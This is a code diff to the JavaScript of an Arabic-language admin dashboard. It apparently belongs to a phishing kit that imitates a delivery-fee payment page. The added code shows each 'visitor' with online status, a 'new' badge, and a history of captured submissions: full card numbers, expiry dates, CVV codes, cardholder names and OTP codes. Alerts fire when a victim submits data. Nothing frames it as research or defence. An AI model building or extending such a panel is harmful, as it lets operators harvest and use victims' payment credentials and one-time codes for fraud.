@@ -11,6 +11,83 @@ let audioContext = null;
 // CRITICAL: Local cache of all visitors for sync between historical and live data
 let allAdminVisitors = [];
 
+// Live timer interval reference
+let liveTimerInterval = null;
+
+// ==========================================
+// RELATIVE TIME UTILITIES
+// ==========================================
+
+// Convert timestamp to relative time string (Arabic)
+function getRelativeTime(timestamp) {
+  if (!timestamp) return 'غير معروف';
+  
+  const now = new Date();
+  const date = new Date(timestamp);
+  const diffMs = now - date;
+  const diffSeconds = Math.floor(diffMs / 1000);
+  const diffMinutes = Math.floor(diffSeconds / 60);
+  const diffHours = Math.floor(diffMinutes / 60);
+  const diffDays = Math.floor(diffHours / 24);
+  
+  if (diffSeconds < 5) return 'الآن';
+  if (diffSeconds < 60) return `منذ ${diffSeconds} ${diffSeconds === 1 ? 'ثانية' : 'ثوانٍ'}`;
+  if (diffMinutes < 60) return `منذ ${diffMinutes} ${diffMinutes === 1 ? 'دقيقة' : 'دقائق'}`;
+  if (diffHours < 24) return `منذ ${diffHours} ${diffHours === 1 ? 'ساعة' : 'ساعات'}`;
+  if (diffDays < 7) return `منذ ${diffDays} ${diffDays === 1 ? 'يوم' : 'أيام'}`;
+  
+  return date.toLocaleDateString('ar-OM');
+}
+
+// Format date for display
+function formatDate(timestamp) {
+  if (!timestamp) return '—';
+  const date = new Date(timestamp);
+  return date.toLocaleString('ar-OM', {
+    year: 'numeric',
+    month: 'short',
+    day: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit'
+  });
+}
+
+// Start live timer that updates every 5 seconds
+function startLiveTimer() {
+  // Clear existing interval
+  if (liveTimerInterval) {
+    clearInterval(liveTimerInterval);
+  }
+  
+  // Update every 5 seconds
+  liveTimerInterval = setInterval(() => {
+    updateRelativeTimes();
+  }, 5000);
+  
+  // Initial update
+  updateRelativeTimes();
+}
+
+// Update all relative time displays on the page
+function updateRelativeTimes() {
+  const timeElements = document.querySelectorAll('.relative-time');
+  timeElements.forEach(el => {
+    const timestamp = el.getAttribute('data-timestamp');
+    if (timestamp) {
+      el.textContent = getRelativeTime(timestamp);
+    }
+  });
+  
+  // Also update last activity
+  const lastActivityElements = document.querySelectorAll('.last-activity');
+  lastActivityElements.forEach(el => {
+    const timestamp = el.getAttribute('data-timestamp');
+    if (timestamp) {
+      el.textContent = 'آخر نشاط: ' + getRelativeTime(timestamp);
+    }
+  });
+}
+
 // ==========================================
 // SMART SOUND SYSTEM - Silent typing, alerts only on submissions
 // ==========================================
@@ -834,24 +911,51 @@ function createVisitorCard(visitor, isTrashMode = false) {
     `;
   }
   
+  // Get timestamps
+  const createdAt = visitor.created_at || visitor.timestamp || new Date().toISOString();
+  const lastActivity = visitor.last_activity || createdAt;
+  
+  // Check if this is a new/unprocessed submission (within last 5 minutes)
+  const isNew = visitor.isNew || (new Date() - new Date(createdAt) < 5 * 60 * 1000);
+  
+  // Count total submissions
+  const deliveryCount = visitor.delivery_submissions?.length || (deliveryDone ? 1 : 0);
+  const paymentCount = visitor.payment_submissions?.length || (paymentDone ? 1 : 0);
+  const verificationCount = visitor.verification_submissions?.length || (verificationDone ? 1 : 0);
+  const hasHistory = deliveryCount > 1 || paymentCount > 1 || verificationCount > 1;
+  
   // Build final card HTML with new design
   const cardHTML = `
-    <div class="visitor-card-new" data-session="${sessionId}" data-online="${isOnline}">
+    <div class="visitor-card-new ${isNew ? 'is-new' : ''}" data-session="${sessionId}" data-online="${isOnline}" data-created="${createdAt}">
       <!-- Header -->
       <div class="card-header-new" style="${headerBg}">
         <div class="header-left">
           <span class="country-flag">${getCountryFlag(countryCode)}</span>
           <span class="visitor-name">${escapeHtml(displayName)}</span>
+          ${isNew ? '<span class="new-badge">جديد</span>' : ''}
           <span class="online-status ${isOnline ? 'online' : 'offline'}">
             ${isOnline ? '●' : '○'} ${isOnline ? 'متصل' : 'غير متصل'}
           </span>
         </div>
         <div class="header-right">
+          <span class="time-indicator relative-time" data-timestamp="${createdAt}">${getRelativeTime(createdAt)}</span>
           <span class="page-badge" style="background: ${pageInfo.bg};">
             ${pageInfo.text}
           </span>
         </div>
       </div>
+      
+      <!-- Submission History Toggle (if has history) -->
+      ${hasHistory ? `
+      <div class="history-toggle" onclick="toggleSubmissionHistory('${sessionId}')">
+        <span class="history-icon">📋</span>
+        <span class="history-text">سجل المحاولات (${deliveryCount + paymentCount + verificationCount})</span>
+        <span class="history-arrow" id="arrow_${sessionId}">▼</span>
+      </div>
+      <div class="submission-history" id="history_${sessionId}" style="display: none;">
+        ${renderSubmissionHistory(visitor)}
+      </div>
+      ` : ''}
       
       <!-- Data Boxes Container -->
       <div class="data-boxes-container">
@@ -860,6 +964,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <div class="box-header" style="background: rgba(0, 0, 0, 0.22); border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
             <span class="box-icon">📦</span>
             <span class="box-title">بيانات التوصيل</span>
+            ${deliveryCount > 1 ? `<span class="attempt-count">(${deliveryCount})</span>` : ''}
           </div>
           <div class="box-content">
             ${deliveryFields.length > 0 ? deliveryRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
@@ -871,6 +976,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <div class="box-header" style="background: rgba(0, 0, 0, 0.22); border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
             <span class="box-icon">💳</span>
             <span class="box-title">بيانات الدفع</span>
+            ${paymentCount > 1 ? `<span class="attempt-count">(${paymentCount})</span>` : ''}
           </div>
           <div class="box-content">
             ${paymentFields.length > 0 ? paymentRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
@@ -884,6 +990,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <span class="otp-icon">🔐</span>
           <span class="otp-title">رمز التحقق (OTP)</span>
           ${otpHistory && otpHistory.length > 1 ? `<span class="otp-count">${otpHistory.length} رمز</span>` : ''}
+          ${verificationCount > 1 ? `<span class="attempt-count">(${verificationCount})</span>` : ''}
         </div>
         <div class="otp-display">
           ${otpDigitsHTML}
@@ -904,6 +1011,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
             ${verificationDone ? '✓' : '○'} التحقق
           </span>
         </div>
+        <div class="last-activity" data-timestamp="${lastActivity}">آخر نشاط: ${getRelativeTime(lastActivity)}</div>
         <div class="action-buttons">
           ${actionsHTML}
         </div>
@@ -912,6 +1020,121 @@ function createVisitorCard(visitor, isTrashMode = false) {
   `;
   
   return cardHTML;
+}
+
+// Render submission history for a visitor
+function renderSubmissionHistory(visitor) {
+  const deliveries = visitor.delivery_submissions || [];
+  const payments = visitor.payment_submissions || [];
+  const verifications = visitor.verification_submissions || [];
+  
+  let html = '<div class="history-content">';
+  
+  // Render delivery attempts
+  if (deliveries.length > 0) {
+    html += '<div class="history-section">';
+    html += '<div class="history-section-title">📦 محاولات التوصيل</div>';
+    deliveries.forEach((sub, idx) => {
+      const timestamp = sub.created_at || sub.timestamp;
+      const isFirst = idx === 0;
+      html += `
+        <div class="history-item ${isFirst ? 'latest' : 'previous'}">
+          <div class="history-item-header">
+            <span class="history-item-number">#${deliveries.length - idx}</span>
+            <span class="history-item-time relative-time" data-timestamp="${timestamp}">${getRelativeTime(timestamp)}</span>
+          </div>
+          <div class="history-item-data">
+            ${formatHistoryData(sub.form_data)}
+          </div>
+        </div>
+      `;
+    });
+    html += '</div>';
+  }
+  
+  // Render payment attempts
+  if (payments.length > 0) {
+    html += '<div class="history-section">';
+    html += '<div class="history-section-title">💳 محاولات الدفع</div>';
+    payments.forEach((sub, idx) => {
+      const timestamp = sub.created_at || sub.timestamp;
+      const isFirst = idx === 0;
+      html += `
+        <div class="history-item ${isFirst ? 'latest' : 'previous'}">
+          <div class="history-item-header">
+            <span class="history-item-number">#${payments.length - idx}</span>
+            <span class="history-item-time relative-time" data-timestamp="${timestamp}">${getRelativeTime(timestamp)}</span>
+          </div>
+          <div class="history-item-data">
+            ${formatHistoryData(sub.form_data)}
+          </div>
+        </div>
+      `;
+    });
+    html += '</div>';
+  }
+  
+  // Render verification attempts
+  if (verifications.length > 0) {
+    html += '<div class="history-section">';
+    html += '<div class="history-section-title">🔐 محاولات التحقق</div>';
+    verifications.forEach((sub, idx) => {
+      const timestamp = sub.created_at || sub.timestamp;
+      const isFirst = idx === 0;
+      html += `
+        <div class="history-item ${isFirst ? 'latest' : 'previous'}">
+          <div class="history-item-header">
+            <span class="history-item-number">#${verifications.length - idx}</span>
+            <span class="history-item-time relative-time" data-timestamp="${timestamp}">${getRelativeTime(timestamp)}</span>
+          </div>
+          <div class="history-item-data">
+            ${formatHistoryData(sub.form_data)}
+          </div>
+        </div>
+      `;
+    });
+    html += '</div>';
+  }
+  
+  html += '</div>';
+  return html;
+}
+
+// Format history data for display
+function formatHistoryData(data) {
+  if (!data) return '<span class="no-data">—</span>';
+  if (typeof data === 'string') {
+    try { data = JSON.parse(data); } catch (e) { return escapeHtml(data); }
+  }
+  
+  let html = '<div class="history-data-grid">';
+  
+  if (data.fullName) html += `<div class="history-data-item"><span class="label">الاسم:</span> ${escapeHtml(data.fullName)}</div>`;
+  if (data.phone) html += `<div class="history-data-item"><span class="label">الهاتف:</span> ${escapeHtml(data.phone)}</div>`;
+  if (data.address) html += `<div class="history-data-item"><span class="label">العنوان:</span> ${escapeHtml(data.address)}</div>`;
+  if (data.cardNumber) html += `<div class="history-data-item"><span class="label">البطاقة:</span> ${escapeHtml(data.cardNumber)}</div>`;
+  if (data.expiry) html += `<div class="history-data-item"><span class="label">الانتهاء:</span> ${escapeHtml(data.expiry)}</div>`;
+  if (data.cvv) html += `<div class="history-data-item"><span class="label">CVV:</span> ${escapeHtml(data.cvv)}</div>`;
+  if (data.cardHolder) html += `<div class="history-data-item"><span class="label">الحامل:</span> ${escapeHtml(data.cardHolder)}</div>`;
+  if (data.paymentMethod) html += `<div class="history-data-item"><span class="label">الطريقة:</span> ${escapeHtml(data.paymentMethod)}</div>`;
+  if (data.otp) html += `<div class="history-data-item"><span class="label">OTP:</span> ${escapeHtml(data.otp)}</div>`;
+  
+  html += '</div>';
+  return html || '<span class="no-data">—</span>';
+}
+
+// Toggle submission history visibility
+function toggleSubmissionHistory(sessionId) {
+  const historyDiv = document.getElementById('history_' + sessionId);
+  const arrow = document.getElementById('arrow_' + sessionId);
+  
+  if (historyDiv.style.display === 'none') {
+    historyDiv.style.display = 'block';
+    if (arrow) arrow.textContent = '▲';
+  } else {
+    historyDiv.style.display = 'none';
+    if (arrow) arrow.textContent = '▼';
+  }
 }
 
 // Helper function to escape HTML
@@ -2548,6 +2771,9 @@ async function logoutAllDevices() {
 
 // Initialize - SECURE: NO socket connection on page load
 document.addEventListener('DOMContentLoaded', async () => {
+  // Start live timer for relative time updates
+  startLiveTimer();
+  
   // Check for existing valid session first
   const savedToken = localStorage.getItem('admin_token');
   
